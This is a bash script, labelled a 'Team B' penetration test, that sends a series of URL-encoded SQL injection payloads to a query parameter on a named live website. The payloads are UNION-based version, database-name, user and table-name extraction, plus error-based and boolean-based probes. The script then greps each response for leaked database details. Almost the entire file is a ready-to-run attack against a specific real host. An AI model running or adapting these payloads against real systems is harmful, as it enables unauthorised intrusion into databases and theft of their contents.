#!/bin/bash

# SQL Injection Data Extraction Test
# Team B - Panama8888b Penetration Test

BASE_URL="https://member.panama8888b.com/public/js/v2/app.js"

echo "[+] SQL Injection Data Extraction Test"
echo "[+] Target: $BASE_URL"
echo "=================================================="

# Function to test and extract data
extract_data() {
    local payload="$1"
    local description="$2"
    
    echo ""
    echo "[*] Testing: $description"
    echo "[*] Payload: $payload"
    
    # Save response to file for analysis
    response_file="/tmp/sql_response_$(date +%s).txt"
    
    curl -s "$BASE_URL?v=$payload" -o "$response_file" -w "Response Time: %{time_total}s, HTTP Code: %{http_code}\n"
    
    # Check response size and content
    file_size=$(wc -c < "$response_file")
    echo "[+] Response Size: $file_size bytes"
    
    # Look for different response patterns
    if [ $file_size -gt 0 ]; then
        # Check for error messages
        if grep -qi "error\|sql\|syntax\|database" "$response_file"; then
            echo "[!] Potential SQL error found in response"
            grep -i "error\|sql\|syntax\|database" "$response_file" | head -3
        fi
        
        # Check for version information
        if grep -qi "microsoft\|sql server\|version" "$response_file"; then
            echo "[!] Potential database version information found"
            grep -i "microsoft\|sql server\|version" "$response_file" | head -3
        fi
        
        # Check for table/database names
        if grep -qi "table\|database\|schema" "$response_file"; then
            echo "[!] Potential database structure information found"
            grep -i "table\|database\|schema" "$response_file" | head -3
        fi
    fi
    
    # Clean up
    rm -f "$response_file"
}

# Test different extraction methods
echo ""
echo "[*] Testing Database Version Extraction"

# Try different methods to extract version
extract_data "25.1%27%20UNION%20SELECT%20%40%40version--" "UNION SELECT @@version (single quote)"
extract_data "25.1%29%20UNION%20SELECT%20%40%40version--" "UNION SELECT @@version (closing paren)"
extract_data "25.1%22%20UNION%20SELECT%20%40%40version--" "UNION SELECT @@version (double quote)"

echo ""
echo "[*] Testing Database Name Extraction"
extract_data "25.1%27%20UNION%20SELECT%20DB_NAME%28%29--" "UNION SELECT DB_NAME()"
extract_data "25.1%29%20UNION%20SELECT%20DB_NAME%28%29--" "UNION SELECT DB_NAME() (paren)"

echo ""
echo "[*] Testing User Information Extraction"
extract_data "25.1%27%20UNION%20SELECT%20USER_NAME%28%29--" "UNION SELECT USER_NAME()"
extract_data "25.1%27%20UNION%20SELECT%20SYSTEM_USER--" "UNION SELECT SYSTEM_USER"

echo ""
echo "[*] Testing Table Information Extraction"
extract_data "25.1%27%20UNION%20SELECT%20name%20FROM%20sysobjects%20WHERE%20xtype%3D%27U%27--" "SELECT table names from sysobjects"
extract_data "25.1%27%20UNION%20SELECT%20TABLE_NAME%20FROM%20INFORMATION_SCHEMA.TABLES--" "SELECT from INFORMATION_SCHEMA.TABLES"

echo ""
echo "[*] Testing Error-Based Information Extraction"
extract_data "25.1%27%20AND%20%28SELECT%20%40%40version%29%3E0--" "Error-based version extraction"
extract_data "25.1%27%20AND%20CAST%28%40%40version%20AS%20int%29%3E0--" "CAST error for version extraction"

echo ""
echo "[*] Testing Boolean-Based Information Extraction"
extract_data "25.1%27%20AND%20%28SELECT%20SUBSTRING%28%40%40version%2C1%2C1%29%29%3D%27M%27--" "Check if version starts with 'M'"
extract_data "25.1%27%20AND%20%28SELECT%20LEN%28DB_NAME%28%29%29%29%3E5--" "Check database name length"

echo ""
echo "[+] Data Extraction Test Complete"
echo "[*] Check above for any extracted database information"
echo "[*] Look for differences in response sizes or error messages"
echo "[*] Any successful extraction indicates SQL injection vulnerability"